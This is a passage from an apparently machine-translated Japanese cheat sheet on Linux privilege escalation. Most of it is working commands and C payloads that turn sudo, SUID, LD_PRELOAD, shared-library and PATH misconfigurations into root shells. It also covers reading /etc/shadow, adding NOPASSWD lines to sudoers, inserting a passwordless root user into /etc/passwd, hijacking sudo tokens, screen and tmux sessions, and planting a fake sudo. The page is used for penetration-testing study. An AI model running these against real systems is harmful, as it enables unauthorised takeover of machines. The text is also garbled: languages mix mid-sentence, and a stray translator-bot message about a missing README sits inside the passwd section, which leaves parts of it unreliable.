for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部のLinuxバージョンには、**UID > INT_MAX** のユーザーが権限昇格できてしまうバグが存在しました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**悪用するには**: **`systemd-run -t /bin/bash`**

### グループ

root権限を与える可能性のある**あるグループのメンバー**かどうか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であればクリップボードの中に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

If you **知っているパスワードがある場合** of the environment **そのパスワードを使って各ユーザーにログインしてみてください**.

### Su Brute

大量のノイズを出すことを気にせず、かつそのコンピュータに `su` と `timeout` バイナリが存在する場合、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーをブルートフォースすることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーのブルートフォースも試みます。

## 書き込み可能な PATH の悪用

### $PATH

もし $PATH のいずれかのフォルダに**書き込みできる**ことが分かれば、別のユーザー（理想的には root）が実行するコマンド名で、かつあなたの書き込み可能なフォルダより前にあるフォルダから**読み込まれない**ように、書き込み可能なフォルダ内に**バックドアを作成する**ことで権限を昇格できる可能性があります。

### SUDO and SUID

sudo を使って実行できるコマンドが許可されている場合や、コマンドが suid ビットを持っている場合があります。以下で確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の **予期しないコマンドは、ファイルの読み取りや書き込み、さらにはコマンドの実行を可能にします。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudoの設定により、ユーザーはパスワードを知らなくても別のユーザーの権限でコマンドを実行できることがある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー `demo` が `root` として `vim` を実行できます。root ディレクトリに ssh key を追加するか、`sh` を呼び出すことでシェルを取得するのは簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する際に**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer をベースにした**もので、スクリプトが root として実行されている間に任意の python ライブラリを読み込むために **PYTHONPATH hijacking** に**脆弱**でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Why it works: 非対話シェルでは、Bash が `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを読み込みます。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。`BASH_ENV` が sudo によって保持されている場合、あなたのファイルは root 権限で読み込まれます。

- Requirements:
- 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を推奨。
- sudo で許可されたコマンドには shell wrappers を避け、最小限のバイナリを使用する。
- preserved env vars が使われる場合に sudo の I/O ロギングとアラートを検討する。

### Sudo 実行のバイパス経路

**ジャンプ**して他のファイルを読む、または **symlinks** を使う。例えば sudoers ファイルでは： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし **wildcard** が使われている場合 (\*), さらに簡単になります:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo コマンド/SUID バイナリ（コマンドのパスが指定されていない場合）

もし**sudo権限**が単一のコマンドに対して**パスを指定せずに**与えられている場合：_hacker10 ALL= (root) less_、PATH変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリ **がパスを指定せずに別のコマンドを実行する場合（怪しい SUID バイナリの中身は常に** _**strings**_ **で確認してください）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary にコマンドのパスがある場合

もし**suid** バイナリが**コマンドのパスを指定して別のコマンドを実行している**場合、suid ファイルが呼び出しているコマンド名で関数を作成してそれを**export**してみてください。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、そのコマンド名で関数を作成してexportしてみてください：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid binary を呼び出すと、この関数が実行されます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

環境変数 **LD_PRELOAD** は、標準 C ライブラリ（`libc.so`）を含め、他のすべてのライブラリより前にローダによって読み込まれる1つ以上の共有ライブラリ（.so ファイル）を指定するために使用されます。この処理はライブラリのプリロードとして知られています。

しかし、この機能が悪用されるのを防ぎ、特に **suid/sgid** 実行ファイルに対してシステムのセキュリティを維持するために、システムはいくつかの条件を課します：

- 実ユーザー ID (_ruid_) が実効ユーザー ID (_euid_) と一致しない実行ファイルに対しては、ローダは **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルの場合、プリロードされるのは標準パスにあり、かつ suid/sgid であるライブラリのみです。

`sudo` でコマンドを実行でき、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合、権限昇格が発生する可能性があります。この設定により、`sudo` 経由でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、任意のコードが昇格した権限で実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
次の名前で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
それから **それをコンパイル** するには:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を行う
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 同様の privesc は、攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合に悪用される可能性があります。攻撃者がライブラリの検索パスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

通常とは異なる見た目の**SUID**権限を持つバイナリに遭遇した場合、**.so**ファイルを正しく読み込んでいるかどうかを確認するのが良い習慣です。これは次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、エラー _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ に遭遇した場合、exploitation の可能性が示唆されます。

これを exploit するには、C ファイル、例えば _"/path/to/.config/libcalc.c"_ を作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、特権を持つシェルを実行することで権限を昇格させることを目的としています。

上記の C ファイルを共有オブジェクト (.so) ファイルにコンパイルするには:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit が発動し、システムの侵害につながる可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
書き込み可能なフォルダからライブラリを読み込む SUID バイナリを見つけたので、そのフォルダに必要な名前でライブラリを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが表示された場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **only inject arguments** in a command.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に sh シェルを作成し、**root 所有で setuid が付与されます**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化して全ユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダまたはフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使用して、**create a sudo token for a user and PID** できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 の shell を持っている場合、パスワードを知らなくても **obtain sudo privileges** することができます。次のように実行します:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるか、そしてどのように使えるかを設定します。これらのファイルは**デフォルトではユーザー root とグループ root のみが読み取り可能**です。\
**もし** このファイルを**読む**ことができれば、いくつかの興味深い情報を**得られる**かもしれません。さらに、任意のファイルに**書き込み**できれば、**escalate privileges** することができます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
write ができれば、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

sudo バイナリの代替として、OpenBSD の `doas` などがあります。設定は `/etc/doas.conf` で確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続して `sudo` を使用して権限昇格する**ことが分かっていて、かつそのユーザーコンテキスト内でシェルを得ている場合、あなたは**新しい sudo 実行ファイルを作成**して、まずあなたのコードを root として実行し、その後にユーザーのコマンドを実行させることができます。その後、ユーザーコンテキストの **$PATH** を変更（例えば新しいパスを .bash_profile に追加）しておけば、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されます。

ユーザーが別のシェル（bash ではない）を使っている場合は、新しいパスを追加するために別のファイルを修正する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります

または次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**ロードされる設定ファイルがどこから来るか**を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` にある設定ファイルが読み込まれます。これらの設定ファイルは**ライブラリが検索される他のフォルダ**を指しています。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**これはシステムが `/usr/local/lib` 内をライブラリ検索することを意味します。**

もし何らかの理由で示されたパスのいずれか、つまり `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルが指す任意のフォルダに対して**ユーザーが書き込み権限を持っている**場合、そのユーザーは権限を昇格できる可能性があります。\
このミスコンフィギュレーションを悪用する方法については、以下のページを参照してください：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/` に lib をコピーすると、`RPATH` 変数で指定されているこの場所でプログラムにより使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に `/var/tmp` に悪意のあるライブラリを作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセット**を提供します。これにより root の**権限をより小さく区別できる単位**に分割できます。これらの各単位は個別にプロセスへ付与可能です。こうして権限の全体量が減り、悪用のリスクが低下します。\
次のページを読んで、**capabilities とその悪用方法**について詳しく学んでください：


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**bit for "execute"** は対象ユーザーが **"cd"** できることを意味します。\
**"read"** ビットはユーザーが**ファイルを一覧表示**できることを意味し、**"write"** ビットはユーザーが**ファイルを削除および新規作成**できることを意味します。

## ACLs

Access Control Lists (ACLs) は、従来の ugo/rwx 権限を**上書きできる**二次的な任意権限レイヤーを表します。これらの権限は、所有者やグループの一員でない特定ユーザーに対してアクセスを許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの**粒度によりより正確なアクセス管理が可能になります**。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" にファイルの読み取りおよび書き込み権限を付与する:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定のACLを持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shellセッションを開く

**古いバージョン**では、ある別のユーザー（**root**）の**shell**セッションを**hijack**できることがあります。\
**最新のバージョン**では、**自分のユーザー**のscreenセッションにのみ**connect**できるようになります。とはいえ、**セッション内の興味深い情報**を見つけることがあるかもしれません。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチ**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux バージョン** の問題でした。非特権ユーザーとして、root によって作成された tmux (v2.1) session を hijack できませんでした。

**tmux sessions を一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として **Valentine box from HTB** を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に Debian 系システム（Ubuntu、Kubuntu など）で生成されたすべての SSL および SSH キーはこのバグの影響を受ける可能性があります.\\
このバグはこれらの OS 上で新しい ssh キーを作成した際に発生します。なぜなら **可能な組み合わせはわずか 32,768 通りしかなかった** からです。つまり、全ての可能性を計算でき、**ssh の公開鍵を持っていれば対応する秘密鍵を探すことができる**ということです。計算された候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** パスワード認証が許可されているかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列のアカウントへのログインを許可するかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh でログインできるかを指定します。デフォルトは `no` です。可能な値：

- `yes`: root はパスワードおよび秘密鍵でログインできます
- `without-password` or `prohibit-password`: root は秘密鍵でのみログインできます
- `forced-commands-only`: root は秘密鍵でのみログインでき、かつコマンドオプションが指定されている場合に限ります
- `no` : 許可しない

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置き換えられます。**絶対パスを指定することもできます**（`/` で始まる）または**ユーザーのホームからの相対パス**。例えば：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーでログインしようとした場合、ssh はあなたのキーの公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にある公開鍵と比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding は、サーバーに鍵を置いたままにする代わりに **use your local SSH keys instead of leaving keys**（パスフレーズなしで！）ことを可能にします。つまり、ssh 経由で **jump** **to a host** し、そこから **jump to another** host に移動して、**initial host** にある **key** を **using** して接続することができます。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの**オプション**を**上書き**して、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` で ssh-agent forwarding を**許可**または**拒否**できます（デフォルトは許可）。

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 注目ファイル

### プロファイルファイル

ファイル `/etc/profile` および `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを起動したときに実行される**スクリプト**です。したがって、これらのいずれかに**書き込みまたは変更ができる場合、権限を昇格させることができます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし不審な profile script が見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow Files

OSによっては`/etc/passwd`および`/etc/shadow`ファイルが別名になっているか、バックアップが存在することがあります。したがって、**すべてを見つけ出し**、**読み取れるか確認して**、ファイル内に**hashes**が含まれているかを確認することをおすすめします:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、**password hashes** を `/etc/passwd`（または同等のファイル）内で見つけることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd が書き込み可能

まず、次のコマンドのいずれかで password を生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the README.md text you want translated (or give a link to it). 

Also clarify how you want the "add the user `hacker` and add the generated password" inserted:
- Should it be a single sentence/line in the README, or a code block with commands?
- Do you want me to generate a secure password now? If so, specify length and whether to include symbols, or I can pick a strong default.

Once you provide the file (and confirm password preferences), I'll translate the relevant English to Japanese, keep markdown/html/tags/paths untouched, and add the user line with the generated password as requested.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドで `hacker:hacker` を使用できます。

あるいは、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**いくつかの機密ファイルに書き込めるかどうか**を確認してください。例えば、ある **サービスの設定ファイル** に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバを実行していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる** 場合、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### フォルダを確認

次のフォルダにはバックアップや有用な情報が含まれている場合があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** （おそらく最後のものにはアクセスできないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近の数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみてください。これは **パスワードを含む可能性のあるいくつかのファイル** を検索します。\
そのために使用できる**もう1つの興味深いツール**は: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows, Linux & Mac のローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

### Logs

If you can read logs, you may be able to find **興味深い／機密情報が含まれている** 可能性があります。The more strange the log is, the more interesting it will be (probably).\
また、いくつかの**"bad"**に構成された（backdoored?）**audit logs** は、投稿で説明されているように、audit logs の中にパスワードを**記録する**ことを許す場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むために** [**adm**](interesting-groups-linux-pe/index.html#adm-group) は非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
